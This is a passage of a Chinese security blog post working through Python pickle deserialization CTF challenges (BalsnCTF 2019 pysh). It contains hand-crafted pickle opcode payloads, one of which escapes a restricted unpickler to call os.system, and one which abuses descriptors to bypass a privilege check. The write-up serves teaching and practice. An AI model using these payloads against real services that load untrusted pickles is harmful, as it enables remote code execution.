+<p>实际上是可以的。同样，在我之前写的《Python 沙箱逃逸的经验总结》（见资料 1）里有用 mro 来实现无 import 执行任意命令的方法。我这里就不啰嗦了，直接给出 opcode：<br />
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section"># structs.<span class="hljs-strong">__dict__</span>[&quot;structs&quot;] = structs.<span class="hljs-strong">__builtins__</span></span><br>cstructs\n<span class="hljs-strong">__dict__</span>\nVstructs\ncstructs\n<span class="hljs-strong">__builtins__</span>\ns0<br><br><span class="hljs-section"># structs.<span class="hljs-strong">__builtins__</span>[&#x27;<span class="hljs-strong">__import__</span>&#x27;] = structs.<span class="hljs-strong">__getattribute__</span></span><br>cstructs\n<span class="hljs-strong">__builtins__</span>\nV<span class="hljs-strong">__import__</span>\ncstructs\n<span class="hljs-strong">__getattribute__</span>\ns0<br><br><span class="hljs-section"># get eval</span><br>cstructs\nget\n(Veval\ntR(V<br><br><span class="hljs-section"># 利用 mro 寻找可利用的模块，这里以 sys 为例</span><br>[<span class="hljs-string">x for x in [</span>].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() if x.<span class="hljs-strong">__name__</span> == &quot;<span class="hljs-emphasis">_Printer&quot;][0]._</span>Printer<span class="hljs-strong">__setup.__</span>globals<span class="hljs-strong">__[&#x27;sys&#x27;].modules.get(&quot;os&quot;).system(&quot;whoami&quot;)</span><br><span class="hljs-strong"></span><br><span class="hljs-strong"># 收工</span><br><span class="hljs-strong">\ntR.</span><br></code></pre></td></tr></table></figure></p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/34d78bf0-8b15-40ec-9119-63a6f7bc15b9.png!blog#width-zoom7" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<h3 id="pyshv3">pyshv3</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ----- securePickle.py ----- </span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><br><br>whitelist = []<br><br><br><span class="hljs-comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> module <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> whitelist <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">raise</span> KeyError(<span class="hljs-string">&#x27;The pickle is spoilt :(&#x27;</span>)<br>        <span class="hljs-keyword">return</span> pickle.Unpickler.find_class(<span class="hljs-variable language_">self</span>, module, name)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br><br><br>dumps = pickle.dumps<br><br><br><br><span class="hljs-comment">#  ----- server.py ----- </span><br><span class="hljs-keyword">import</span> securePickle <span class="hljs-keyword">as</span> pickle<br><span class="hljs-keyword">import</span> codecs<br><span class="hljs-keyword">import</span> os<br><br><br>pickle.whitelist.append(<span class="hljs-string">&#x27;structs&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pysh</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.key = os.urandom(<span class="hljs-number">100</span>)<br>        <span class="hljs-variable language_">self</span>.login()<br>        <span class="hljs-variable language_">self</span>.cmds = &#123;<br>            <span class="hljs-string">&#x27;help&#x27;</span>: <span class="hljs-variable language_">self</span>.cmd_help,<br>            <span class="hljs-string">&#x27;whoami&#x27;</span>: <span class="hljs-variable language_">self</span>.cmd_whoami,<br>            <span class="hljs-string">&#x27;su&#x27;</span>: <span class="hljs-variable language_">self</span>.cmd_su,<br>            <span class="hljs-string">&#x27;flag&#x27;</span>: <span class="hljs-variable language_">self</span>.cmd_flag,<br>        &#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;../flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            flag = f.read()<br>        flag = <span class="hljs-built_in">bytes</span>(a ^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(<span class="hljs-variable language_">self</span>.key, flag))<br>        user = <span class="hljs-built_in">input</span>().encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>        user = codecs.decode(user, <span class="hljs-string">&#x27;base64&#x27;</span>)<br>        user = pickle.loads(user)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Login as &#x27;</span> + user.name + <span class="hljs-string">&#x27; - &#x27;</span> + user.group)<br>        user.privileged = <span class="hljs-literal">False</span><br>        user.flag = flag<br>        <span class="hljs-variable language_">self</span>.user = user<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            req = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;$ &#x27;</span>)<br>            func = <span class="hljs-variable language_">self</span>.cmds.get(req, <span class="hljs-literal">None</span>)<br>            <span class="hljs-keyword">if</span> func <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;pysh: &#x27;</span> + req + <span class="hljs-string">&#x27;: command not found&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                func()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_help</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Available commands: &#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span>.join(<span class="hljs-variable language_">self</span>.cmds.keys()))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_whoami</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-variable language_">self</span>.user.name, <span class="hljs-variable language_">self</span>.user.group)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_su</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Not Implemented QAQ&quot;</span>)<br>        <span class="hljs-comment"># self.user.privileged = 1</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_flag</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.user.privileged:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag: Permission denied&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(a ^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(<span class="hljs-variable language_">self</span>.user.flag, <span class="hljs-variable language_">self</span>.key)))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pysh = Pysh()<br>    pysh.run()<br><br><br><br><span class="hljs-comment">#  ----- structs.py ----- </span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, group</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.group = group<br>        <span class="hljs-variable language_">self</span>.isadmin = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.prompt = <span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>这道题也比较难。限制如下：</p>
+<ol type="1">
+<li>只能引入 structs 模块</li>
+<li>方法中不能有 <code>.</code></li>
+<li>无法 import 额外的模块。所以要想拿到 flag，<code>self.user.privileged</code> 需要不为 False</li>
+</ol>
+<p>由于 <code>user.privileged = False</code> 是在反序列化之后运行的，所以就算覆盖了 struct 的 privileged，也会被强制改回来。</p>
+<p>我们知道，Python 的点运算符，背后实际上是各种描述器在起作用，而描述器其实由 <code>__getattribute__()</code> 方法调用的。所以这里的思路就是修改描述器使得 <code>.</code> 的行为可控。对于描述器我们并不陌生，如果你没用过，可以看下官方文档，见资料 8。</p>
+<p>如果一个对象定义了 <code>__set__()</code> 或 <code>__delete__()</code>，则它会被视为数据描述器。 仅定义了 <code>__get__()</code> 的描述器称为非数据描述器。</p>
+<p>其中，<code>__set__()</code> 决定了赋值时的行为，所以我们能不能通过重载 <code>__set__</code> 使得 <code>user.privileged = False</code> 失效呢？</p>
+<p>那么这个时候可以等价为：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, group</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.group = group<br>        <span class="hljs-variable language_">self</span>.isadmin = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.prompt = <span class="hljs-string">&#x27;&#x27;</span><br><br><br>user = User(<span class="hljs-string">&quot;tr0y&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>)<br><br><span class="hljs-comment"># 在这里面写入合适的语句</span><br><br>user.privileged = <span class="hljs-literal">False</span><br><span class="hljs-built_in">print</span>(user.privileged)  <span class="hljs-comment"># 使得 user.privileged == True</span><br></code></pre></td></tr></table></figure></p>
+<p>首先，<code>__set__</code> 应该赋予一个 callable（<del>废话</del>），这个 callable 是比较有讲究的：</p>
+<ol type="1">
+<li>必须要有三个参数，执行 <code>user.privileged = False</code> 的时候，分为用于接收 <code>user</code>、<code>privileged</code>、<code>False</code></li>
+<li>返回值必须不为广义的 False（什么 None 啊、"" 啊，都算广义的 False）</li>
+<li>调用的源头必须在一个类中</li>
+</ol>
+<p>那么在这道题目中，User 这个类本身正好符合要求，所以可以这么写：<code>User.__set__ = User</code>。但是如果只写这一句的话，你会发现还是无法改变 <code>user.privileged = False</code> 的行为。</p>
+<p>这个时候就需要看下 <code>__set__</code> 到底如何改变 Python 赋值行为的。对于 <code>obj.attr = value</code>（在对属性赋值时），Python 的查找策略是这样的：查找 <code>obj.__class__.__dict__</code>，如果 attr 存在并且是一个数据描述器，调用 attr 的 <code>__set__</code> 方法，结束。如果不存在，会继续到 <code>obj.__class__</code> 的父类和祖先类中查找，找到数据描述器则调用其 <code>__set__</code> 方法，没找到则执行 <code>obj.__dict__['attr'] = value</code>。</p>
+<p>所以我们应该还要加一句 <code>User.privileged = User("tr0y", "root")</code> 保证 <code>user.__class__.__dict__</code> 已经有了 <code>privileged</code> 并且是一个数据描述器，这样就会走到 <code>__set__</code>。橘友们可能会问，那为什么不能 <code>user.privileged = User("tr0y", "root")</code> 这么写呢？原因在于，privileged 这个属性是不存在于 <code>user</code> 的，所以会继续在父类中找，而父类也没有这个属性，所以直接执行的是 <code>user.__dict__['privileged'] = User("tr0y", "root")</code>，这样是起不到作用的。同时由于 flag 并不存在于 <code>user.__class__.__dict__</code> 里，且父类的 User 也没有 flag 这个属性，所以 flag 这个属性是正常赋值的。</p>
+<p>这样的话，我们要加的语句应该是：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">User.__set__ = User<br>User.privileged = User(<span class="hljs-string">&quot;tr0y&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>)<br></code></pre></td></tr></table></figure></p>
+<p>最后的最后，由于 <code>structs.User.__dict__</code> 是 mappingproxy 类型，所以需要用到变量覆盖里提到的那个 tip</p>
+<p>综上，转为 opcode 就是：<br />
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"># 新增 __set__<br>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(N&#125;V__set__<span class="hljs-symbol">\n</span>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>stb<br>0  # 弹出<br># 新增 privileged<br>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(N&#125;Vprivileged<span class="hljs-symbol">\n</span>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(Vtr0y<span class="hljs-symbol">\n</span>Vroot<span class="hljs-symbol">\n</span>tRstb<br>0  # 弹出<br># 返回 structs.User 实例<br>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(Vtr0y<span class="hljs-symbol">\n</span>Vroot<span class="hljs-symbol">\n</span>tR.<br><br># 最终 payload<br>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(N&#125;V__set__<span class="hljs-symbol">\n</span>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>stb0cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(N&#125;Vprivileged<span class="hljs-symbol">\n</span>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(Vtr0y<span class="hljs-symbol">\n</span>Vroot<span class="hljs-symbol">\n</span>tRstb0cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(Vtr0y<span class="hljs-symbol">\n</span>Vroot<span class="hljs-symbol">\n</span>tR.<br></code></pre></td></tr></table></figure></p>
+<h2 id="总结">总结</h2>
+<p>橘友们应该可以发现，opcode 有个特点是“赋值容易查值难”。如何利用 opcode 构造 payload 需要多练习才能掌握，以及对 Python 魔术方法等各种稍底层的原理要有一定的理解，才能够知其然也知其所以然。</p>
+<p>Python 反序列化、Python 沙箱逃逸，以及 SSIT 所需的知识点有着很大的关联性，通其一而知其百，保持知识的连通性效率才会高。</p>
+<h2 id="资料">资料</h2>
+<ol type="1">
+<li>Python 沙箱逃逸的经验总结<br />
+https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/</li>
+<li>pickle.py 中 opcode 备注<br />
+https://github.com/python/cpython/blob/9412f4d1ad28d48d8bb4725f05fd8f8d0daf8cd2/Lib/pickle.py#L107</li>
+<li>可以序列化的东西<br />
+https://docs.python.org/zh-cn/3/library/pickle.html#what-can-be-pickled-and-unpickled</li>
+<li>pker，方便生成 opcode 的工具<br />
+https://github.com/EddieIvan01/pker</li>
+<li>Python 的导入机制<br />
+https://docs.python.org/zh-cn/3/reference/import.html#the-import-system</li>
+<li>pickle 的 load_build 逻辑<br />
+https://github.com/python/cpython/blob/9412f4d1ad28d48d8bb4725f05fd8f8d0daf8cd2/Lib/pickle.py#L1697</li>
+<li>BalsnCTF-2019 Python 反序列化题<br />
+https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc</li>
+<li>Python 描述器<br />
+https://docs.python.org/zh-cn/3/howto/descriptor.html</li>
+</ol>
+<br>
+<p style="text-align: center;">
+<font size="2px" color="gray">今年应该是最惨的一个春节<br>在外地居家隔离<br>你说回家吧好像确实也挺无聊的<br>但就是控制不住想回去<br>一个人过春节<br>天天吃政府发的盒饭<br>真是太容易焦虑了<br>希望疫情早点结束<br><br>这篇文章是从除夕开始写的<br>化焦虑为动力了属实是<br><br>这两天搞了个微博账号<br>微博 id 是 6575448477，用户名是 Macr0phag3<br>主要是整活和发一些技术啊、摄影啊之类的日常<br>隔离期间真的话多，有点啰嗦哈哈哈<br>好了就说到这吧<br><br>祝橘友们虎年虎虎生威，大吉大利</font><br />
+<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload style="zoom:30%" />
+</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="category-chain-item">经验总结</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web/">#Web</a>
+      
+        <a href="/tags/SecMap/">#SecMap</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SecMap - 反序列化（Python）</div>
+      <div>https://www.tr0y.wang/2022/02/03/SecMap-unserialize-python/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Tr0y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年2月3日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年3月15日</div>
+        </div>
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/04/13/SecMap-SSTI-jinja2/" title="SecMap - SSTI（jinja2）">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SecMap - SSTI（jinja2）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/01/11/domain-takeover-by-cfp/" title="利用 Cloudflare Partner 劫持域名">
+                        <span class="hidden-mobile">利用 Cloudflare Partner 劫持域名</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'comment');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
